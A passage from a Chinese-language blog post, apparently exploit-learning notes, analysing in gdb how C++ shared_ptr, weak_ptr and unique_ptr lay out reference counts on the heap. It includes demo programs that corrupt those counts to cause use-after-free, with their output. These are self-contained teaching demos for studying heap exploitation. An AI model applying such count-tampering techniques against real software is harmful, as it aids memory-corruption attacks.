class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">ptr1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/24/6793ad0a07ea8.png" alt="Screenshot 2025-01-24 231137.png"/></p> <h5 id="上图是ptr2--ptr1之后的栈空间">   上图是<code class="language-plaintext highlighter-rouge">ptr2 = ptr1</code>之后的栈空间</h5> <h5 id="可以看到其实比较简单-shared_ptr对象本身是-地址指针--一个虚表指针">   可以看到其实比较简单, <code class="language-plaintext highlighter-rouge">shared_ptr</code>对象本身是 <code class="language-plaintext highlighter-rouge">地址(指针) + 一个虚表指针</code></h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793ae2a45c2a.png" alt="Screenshot 2025-01-24 231631.png"/></p> <h5 id="上述指针即get获取的裸指针指向的一个chunk的中间部分-对象的位置-前面的是0x555555557cc8虚表地址-和0x1weak_count-0x2shared_countuse-count值得一提的是weak_count返回的是0-但实际上在内存中存的是1-在之后提到的weak_count指的是内存中的weak_count">   上述指针(即<code class="language-plaintext highlighter-rouge">.get()</code>获取的裸指针)指向的一个<code class="language-plaintext highlighter-rouge">chunk</code>的中间部分, 对象的位置. 前面的是<code class="language-plaintext highlighter-rouge">0x555555557cc8</code>虚表地址, 和<code class="language-plaintext highlighter-rouge">0x1</code>weak_count, <code class="language-plaintext highlighter-rouge">0x2</code>shared_count(use count).<br/>   值得一提的是weak_count返回的是0, 但实际上在内存中存的是1, 在之后提到的weak_count指的是内存中的weak_count</h5> <h5 id="作用域结束之后-分别对两个stdshared_ptr对象进行析构">   作用域结束之后, 分别对两个<code class="language-plaintext highlighter-rouge">std::shared_ptr</code>对象进行析构<br/></h5> <h5 id="第一个析构之后-堆肯定是没有释放的-但是use-count变成了0x1">   第一个析构之后, 堆肯定是没有释放的, 但是use count变成了<code class="language-plaintext highlighter-rouge">0x1</code><br/></h5> <h5 id="然后追踪一下第二个析构">   然后追踪一下第二个析构</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b05b77e6a.png" alt="Screenshot 2025-01-24 213734.png"/></p> <h5 id="注意下面的调用栈-现在在_m_release中">   注意下面的调用栈, 现在在<code class="language-plaintext highlighter-rouge">_M_release()</code>中<br/></h5> <h5 id="movabs这一句-0x100000001直接硬编码在指令里-看来是有bear而来">   <code class="language-plaintext highlighter-rouge">movabs</code>这一句, 0x100000001直接硬编码在指令里, 看来是有bear而来<br/></h5> <h5 id="cmp-rax里是堆块中use-count--weak-count的那一个字长的拷贝-这里就是比较此时是不是两个count都只剩1了-也就是该堆块只有当前正在析构的指针还在引用-如果是的话-zf标志位为1">   <code class="language-plaintext highlighter-rouge">cmp</code>, <code class="language-plaintext highlighter-rouge">rax</code>里是堆块中<code class="language-plaintext highlighter-rouge">use count + weak count</code>的那一个字长的拷贝. 这里就是比较此时是不是两个<code class="language-plaintext highlighter-rouge">count</code>都只剩1了, 也就是该堆块只有当前正在析构的指针还在引用, 如果是的话, ZF标志位为1<br/></h5> <h5 id="sete-al-当equalzf为1时-al被设置为1-反之为0">   <code class="language-plaintext highlighter-rouge">sete al</code>, 当equal(ZF为1)时, al被设置为1, 反之为0<br/></h5> <h5 id="test-al-al-经典按位与用来判断是不是0-结果不是0-zf变成0">   <code class="language-plaintext highlighter-rouge">test al, al</code>, 经典按位与用来判断是不是0, 结果不是0, ZF变成0</h5> <h5 id="je--此时不跳转-进入下面的堆块释放环节">   <code class="language-plaintext highlighter-rouge">je ...</code>, 此时不跳转, 进入下面的堆块释放环节.</h5> <h5 id="释放的环节调用了两个方法-_m_dispose-和_m_destroy-但是在这之前-use-count和weak-count被清零了-如下图">   释放的环节调用了两个方法, <code class="language-plaintext highlighter-rouge">_M_dispose</code>, 和<code class="language-plaintext highlighter-rouge">_M_destroy</code>, 但是在这之前, <code class="language-plaintext highlighter-rouge">use count</code>和<code class="language-plaintext highlighter-rouge">weak count</code>被清零了, 如下图</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b4c72b804.png" alt="Screenshot 2025-01-24 214047.png"/></p> <h5 id="然后分别call了_m_dispose-和_m_destroy">   然后分别<code class="language-plaintext highlighter-rouge">call</code>了<code class="language-plaintext highlighter-rouge">_M_dispose</code>, 和<code class="language-plaintext highlighter-rouge">_M_destroy</code></h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b574dd8dd.png" alt="Screenshot 2025-01-24 221428.png"/> <img src="https://www.helloimg.com/i/2025/01/24/6793b5a67c6ff.png" alt="Screenshot 2025-01-24 215026.png"/></p> <h5 id="在_m_destory中-在__allocator_ptr-之后堆块释放-更细节的调用没再追踪了">   在<code class="language-plaintext highlighter-rouge">_M_destory</code>中, 在<code class="language-plaintext highlighter-rouge">~__allocator_ptr</code>, 之后堆块释放. 更细节的调用没再追踪了</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b6565a060.png" alt="Screenshot 2025-01-24 221129.png"/></p> <h5 id="如果两个count不是1-会进入下面的分支">   如果两个<code class="language-plaintext highlighter-rouge">count</code>不是1, 会进入下面的分支</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b6d9c1d7e.png" alt="Screenshot 2025-01-24 220024.png"/></p> <h3 id="shared_ptr的uaf"> shared_ptr的UAF</h3> <h5 id="根据上面的分析-得知两点">   根据上面的分析, 得知两点<br/></h5> <h5 id="第一-必须要让use-count和weak-count都是1-才能触发堆块释放的操作">   第一, 必须要让<code class="language-plaintext highlighter-rouge">use count</code>和<code class="language-plaintext highlighter-rouge">weak count</code>都是1, 才能触发堆块释放的操作<br/></h5> <h5 id="第二-想要让一个堆块释放-应该先进入一个shared_ptr的析构函数-毕竟没人会在用了智能指针之后还手动delete">   第二, 想要让一个堆块释放, 应该先进入一个<code class="language-plaintext highlighter-rouge">shared_ptr</code>的析构函数, 毕竟没人会在用了智能指针之后还手动delete.<br/></h5> <h5 id="如此-一个简单的uaf思路产生了-利用程序漏洞篡改两个count都是1-然后触发析构-如果此时还有别的shared_ptr没析构-那么就成功uaf了-不过需要注意的是-因为chunk内成员的排布中-虚表和两个count在指针获得的空间的低位-如果想要改这两个成员-可能需要借助别的漏洞">   如此, 一个简单的UAF思路产生了, 利用程序漏洞篡改两个<code class="language-plaintext highlighter-rouge">count</code>都是1, 然后触发析构, 如果此时还有别的<code class="language-plaintext highlighter-rouge">shared_ptr</code>没析构, 那么就成功UAF了, 不过需要注意的是, 因为<code class="language-plaintext highlighter-rouge">chunk</code>内成员的排布中, 虚表和两个<code class="language-plaintext highlighter-rouge">count</code>在指针获得的空间的低位. 如果想要改这两个成员, 可能需要借助别的漏洞.</h5> <h5 id="看另一个demo">   看另一个demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
        <span class="c1">// change use count: 2 -&gt; 1</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">use_count</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">ptr1</span><span class="p">.</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">use_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="c1">// 生命周期结束, ptr1析构, 同时触发ptr和ptr1指向的堆块free</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>

    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span> <span class="c1">// UAF</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span> <span class="o">*</span><span class="n">ptr_new</span> <span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
     
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <h5 id="uaf大成功-没用的知识又增加了">   UAF大成功, 没用的知识又增加了</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ g++ test.cpp -g -o test
$ ./test 
1919810
</code></pre></div></div> <h2 id="weak_ptr">weak_ptr</h2> <h3 id="内存回收方式-1"> 内存回收方式</h3> <h5 id="首先了解一下weak_ptr的使用场景-就是为了避免shared_ptr之间的循环引用">   首先了解一下<code class="language-plaintext highlighter-rouge">weak_ptr</code>的使用场景, 就是为了避免<code class="language-plaintext highlighter-rouge">shared_ptr</code>`之间的循环引用.</h5> <h5 id="先看一个没有循环引用的demo-结构体wrapper有一个成员ptr">   先看一个没有循环引用的demo, 结构体wrapper有一个成员ptr.</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">wrapper</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="c1">///@note wrapprx 应该叫做 wrapperx_ptr 才符合语义, 但是图都截了...</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper3</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">wrapper1</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper2</span><span class="p">;</span>
        <span class="n">wrapper2</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper3</span><span class="p">;</span>
        <span class="n">wrapper3</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/25/679500556e25c.png" alt="Screenshot 2025-01-25 232012.png"/></p> <h5 id="如图-在wrapper3析构之后-对应的内存没有free-事实上-在wrapper1之后-三个chunk才会一起释放-但这个过程中-三个wrapper指向的内存的引用计数在正确地减少">   如图, 在wrapper3析构之后, 对应的内存没有free. 事实上, 在wrapper1之后, 三个chunk才会一起释放. 但这个过程中, 三个wrapper指向的内存的引用计数在正确地减少.</h5> <h5 id="ps-作用域结束时-析构的顺序是构造的顺序是相反的-v12是赋值是产生的copy-可以不管">   ps: 作用域结束时, 析构的顺序是构造的顺序是相反的, v12是赋值是产生的copy, 可以不管</h5> <p><img src="https://www.helloimg.com/i/2025/01/25/67950718340db.png" alt="Screenshot 2025-01-25 234952.png"/></p> <h5 id="stdshared_ptrwrappershared_ptrwrapper1析构wrapper1时-析构了wrapper1-ptr-wrapper1-ptr指针析构时又其指向的对象wrapper2-wrapper2析构时-需要析构wrapper2-ptr-析构wrapper2-ptr是析构了指向的对象wrapper3">   <code class="language-plaintext highlighter-rouge">std::shared_ptr&lt;wrapper&gt;::~shared_ptr(wrapper1);</code>析构<code class="language-plaintext highlighter-rouge">wrapper1</code>时, 析构了<code class="language-plaintext highlighter-rouge">wrapper1-&gt;ptr</code>, <code class="language-plaintext highlighter-rouge">wrapper1-&gt;ptr</code>指针析构时又其指向的对象(wrapper2), <code class="language-plaintext highlighter-rouge">wrapper2</code>析构时, 需要析构<code class="language-plaintext highlighter-rouge">wrapper2-&gt;ptr</code>, 析构<code class="language-plaintext highlighter-rouge">wrapper2-&gt;ptr</code>是析构了指向的对象<code class="language-plaintext highlighter-rouge">*wrapper3</code><br/></h5> <h5 id="wrapper3的chunk释放之后-调用栈回溯-逐个又free其他chunk">   <code class="language-plaintext highlighter-rouge">*wrapper3</code>的chunk释放之后, 调用栈回溯, 逐个又free其他chunk<br/></h5> <h5 id="如果说话的方式简单点-就是析构智能指针就会析构所指向的对象-析构所指向的对象就会该对象使用的智能指针">   如果说话的方式简单点, 就是析构智能指针就会析构所指向的对象, 析构所指向的对象就会该对象使用的智能指针.<br/></h5> <h5 id="在这个过程中-三块内存保存的use_count">   在这个过程中, 三块内存保存的use_count</h5> <table> <thead> <tr> <th style="text-align: center">析构状态</th> <th style="text-align: center">chunk1</th> <th style="text-align: center">chunk2</th> <th style="text-align: center">chunk3</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">没析构</td> <td style="text-align: center">1</td> <td style="text-align: center">2</td> <td style="text-align: center">2</td> </tr> <tr> <td style="text-align: center">wrapper3析构</td> <td style="text-align: center">1</td> <td style="text-align: center">2</td> <td style="text-align: center">1</td> </tr> <tr> <td style="text-align: center">wrapper2析构</td> <td style="text-align: center">1</td> <td style="text-align: center">1</td> <td style="text-align: center">1</td> </tr> <tr> <td style="text-align: center">wrapper1析构</td> <td style="text-align: center">free</td> <td style="text-align: center">free</td> <td style="text-align: center">free</td> </tr> </tbody> </table> <h5 id="进入正题-有循环引用的demo">   进入正题, 有循环引用的demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">wrapper</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">wrapper2</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper1</span><span class="p">;</span>
        <span class="n">wrapper1</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper2</span><span class="p">;</span> <span class="c1">// 构成循环引用</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/25/6794f93b7560c.png" alt="Screenshot 2025-01-25 224711.png"/></p> <h5 id="如图-当作用域结束之后-两块wrapper的内存都没有释放">   如图, 当作用域结束之后, 两块wrapper的内存都没有释放<br/></h5> <h5 id="简单概括一下-智能指针wrapper1析构时-会析构wrapper对象存在第一个chunk里-然后析构ptr成员-析构wrapper存在第二个chunk里-然后又ptr成员-最后回去析构存在第一个chunk里的wrapper-成功转了个圈">   简单概括一下, 智能指针<code class="language-plaintext highlighter-rouge">wrapper1</code>析构时, 会析构<code class="language-plaintext highlighter-rouge">wrapper</code>对象(存在第一个chunk里), 然后析构<code class="language-plaintext highlighter-rouge">ptr</code>成员, 析构<code class="language-plaintext highlighter-rouge">wrapper</code>(存在第二个chunk里), 然后又<code class="language-plaintext highlighter-rouge">ptr</code>成员, 最后回去析构存在第一个chunk里的<code class="language-plaintext highlighter-rouge">wrapper</code>, 成功转了个圈<br/></h5> <h5 id="析构函数应该有什么检查机制可能是检查地址-因为这个循环递归地析构函数调用并不会卡死程序-但是确实会让引用计数无法正确减少-一直都是2-对应的两个chunk永远无法free-变成僵尸内存">   析构函数应该有什么检查机制(可能是检查地址), 因为这个循环递归地析构函数调用并不会卡死程序, 但是确实会让引用计数无法正确减少, 一直都是2, 对应的两个chunk永远无法free, 变成僵尸内存.<br/></h5> <h5 id="打破循环引用的方法之一是将任意一边的指针换成weak_ptr-这样堆块里use_count不增加-取而代之的是weak_count的增加">   打破循环引用的方法之一是将任意一边的指针换成<code class="language-plaintext highlighter-rouge">weak_ptr</code>, 这样堆块里use_count不增加, 取而代之的是weak_count的增加</h5> <h5 id="weak_ptr有几个比较常用的方法">   <code class="language-plaintext highlighter-rouge">weak_ptr</code>有几个比较常用的方法:<br/></h5> <h5 id="1-expired-返回bool值-表示对应的内存是否销毁销毁不等于内存释放">   1. <code class="language-plaintext highlighter-rouge">.expired()</code>, 返回bool值, 表示对应的内存是否销毁(销毁不等于内存释放)<br/></h5> <h5 id="2-lock-返回一个和weak_ptr指向同样内存的shared_ptr-如果已被销毁-将返回一个nullptr">   2. <code class="language-plaintext highlighter-rouge">.lock()</code>, 返回一个和<code class="language-plaintext highlighter-rouge">weak_ptr</code>指向同样内存的<code class="language-plaintext highlighter-rouge">shared_ptr</code>, 如果已被销毁, 将返回一个nullptr<br/></h5> <h5 id="3-use_count-返回内存的引用计数">   3. <code class="language-plaintext highlighter-rouge">.use_count()</code>, 返回内存的引用计数<br/></h5> <h5 id="上述三个特性是相关联的-引用计数为0时-显示已经销毁expired-lock返回nullptr">   上述三个特性是相关联的, 引用计数为0时, 显示已经销毁(expired), <code class="language-plaintext highlighter-rouge">.lock()</code>返回nullptr.<br/></h5> <h5 id="然后关于weak_ptr造成对应内存释放的问题-举个例子">   然后关于<code class="language-plaintext highlighter-rouge">weak_ptr</code>造成对应内存释放的问题, 举个例子</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="作用域结束时-weak_count和use_count为0x0000000100000000-weak_ptr析构时-顺带释放了对应的chunk">   作用域结束时, <code class="language-plaintext highlighter-rouge">weak_count</code>和<code class="language-plaintext highlighter-rouge">use_count</code>为<code class="language-plaintext highlighter-rouge">0x0000000100000000</code>, <code class="language-plaintext highlighter-rouge">weak_ptr</code>析构时, 顺带释放了对应的<code class="language-plaintext highlighter-rouge">chunk</code><br/></h5> <h3 id="利用方式"> 利用方式</h3> <h5 id="方法基本同shared_ptr-但是需要注意weak_ptr必须依赖于一个shared_ptr否则weak_count为0-表示销毁-lock返回nullptr-无法取用该内存-除此之外和上述share_ptr应该一致">   方法基本同<code class="language-plaintext highlighter-rouge">shared_ptr</code>, 但是需要注意<code class="language-plaintext highlighter-rouge">weak_ptr</code>必须依赖于一个<code class="language-plaintext highlighter-rouge">shared_ptr</code>(否则weak_count为0, 表示销毁, <code class="language-plaintext highlighter-rouge">.lock()</code>返回nullptr, 无法取用该内存), 除此之外和上述<code class="language-plaintext highlighter-rouge">share_ptr</code>应该一致</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x123456789</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>

    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">();</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">ptr</span><span class="p">.</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="mh">0x100000001</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    
    <span class="o">*</span><span class="p">(</span><span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">())</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;*</span><span class="n">ptr2</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ g++ test.cpp -g -o test
$ ./test
1919810
</code></pre></div></div> <h5 id="或者反过来-利用weak_ptr的析构导致chunk被提前释放">   或者反过来, 利用<code class="language-plaintext highlighter-rouge">weak_ptr</code>的析构导致<code class="language-plaintext highlighter-rouge">chunk</code>被提前释放<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>

    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span>
                <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">().</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>

    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span> <span class="o">*</span><span class="n">ptr2</span> <span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="效果上是一致的">   效果上是一致的</h5> <h2 id="unique_ptr">unique_ptr</h2> <h3 id="内存回收方式-2"> 内存回收方式</h3> <h5 id="unique_ptr是独占内存的智能指针-一下是几个常用的用法">   <code class="language-plaintext highlighter-rouge">unique_ptr</code>是独占内存的智能指针, 一下是几个常用的用法<br/></h5> <h5 id="1-构造时用stdmake_uniquet或者stdunique_ptrt-ptrnew-t">   1. 构造时用<code class="language-plaintext highlighter-rouge">std::make_unique&lt;T&gt;(...)</code>或者<code class="language-plaintext highlighter-rouge">std::unique_ptr&lt;T&gt; ptr(new T(...))</code><br/></h5> <h5 id="2-unique_ptr之间赋值时需要使用转移语义stdmove-否则编译不通过">   2. <code class="language-plaintext highlighter-rouge">unique_ptr</code>之间赋值时需要使用转移语义<code class="language-plaintext highlighter-rouge">std::move(...)</code>, 否则编译不通过<br/></h5> <h5 id="3-t-raw_ptr--ptrrelease-release方法解除unique_ptr对一个chunk的绑定变成nullptr-并且会返回对应的裸指针">   3. <code class="language-plaintext highlighter-rouge">T* raw_ptr = ptr.release()</code>, <code class="language-plaintext highlighter-rouge">.release()</code>方法解除<code class="language-plaintext highlighter-rouge">unique_ptr</code>对一个<code class="language-plaintext highlighter-rouge">chunk</code>的绑定(变成nullptr), 并且会返回对应的裸指针.<br/></h5> <h5 id="4-ptrreset-如果ptr不是nullptr-那么会解除绑定并且释放内存-如果ptr是nullptr-则无事发生">   4. <code class="language-plaintext 